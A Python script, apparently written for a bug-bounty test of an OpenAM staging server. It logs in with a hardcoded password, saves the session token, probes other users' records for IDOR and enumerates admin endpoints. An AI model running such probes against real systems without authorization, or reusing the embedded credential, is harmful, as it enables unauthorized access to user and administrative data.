# -*- coding: utf-8 -*-
"""AIC 第十七轮:会话登录 + iPlanetDirectoryPro header 认证 + 授权面全面复查
预期结果表:
  成立 -> 会话有效,AM REST 正常响应;查询边界(自己可见/他人不可见)
  不成立(发现) -> 越权可读他人/管理端点
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
H = {'User-Agent': 'research-1643', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
     'Content-Type': 'application/json'}
S.headers.update(H)

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
tok = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False).json().get('tokenId')
print('LOGIN OK:', tok[:40])
with open(r'D:\scan\_aic_sess.txt', 'w') as f:
    f.write(tok)

# 会话认证:header iPlanetDirectoryPro(OpenAM REST 标准)
S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643',
                   'iPlanetDirectoryPro': tok,
                   'Accept-API-Version': 'resource=2.1, protocol=1.0'})

def probe(method, path, body=None):
    kw = {}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, timeout=12, verify=False, **kw)
        print('%-5s %-78s -> %d  %s' % (method, path[:78], r.status_code, r.text[:250].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-78s -> ERR %s' % (method, path[:78], str(e)[:60]))

print('\n=== 1. 会话验证 ===')
probe('POST', '/am/json/realms/root/realms/alpha/sessions?_action=getSessionInfo', {'withCredentials': True})
probe('POST', '/am/json/realms/root/realms/alpha/sessions?_action=validate')

print('\n=== 2. 查询自己(基线) ===')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22pccp%22')
probe('GET', '/am/json/realms/root/realms/alpha/users/db3d6356-61a0-4684-9eaa-c1353dfa44d9')
probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=true')

print('\n=== 3. 查询他人(IDOR) ===')
for q in ['userName+eq+%22researcher1643%22', 'mail+eq+%221643584176%40wearehackerone.com%22',
          'userName+sw+%22pccp%22', 'userName+sw+%22admin%22']:
    probe('GET', '/am/json/realms/root/realms/alpha/users?_queryFilter=' + q)

print('\n=== 4. 管理面复查 ===')
for p in ['/am/json/realms/root/realms/alpha/groups?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/applications?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/agents?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/policies?_queryFilter=true',
          '/am/json/realms/root/realms/alpha/realms',
          '/am/json/realms/root/realms/alpha/realm-config',
          '/am/json/realms/root/realms/alpha/selfservice/kba',
          '/am/json/realms/root/realms/alpha/selfservice/registration',
          '/am/json/realms/root/realms/alpha/selfservice/passwordReset']:
    probe('GET', p)
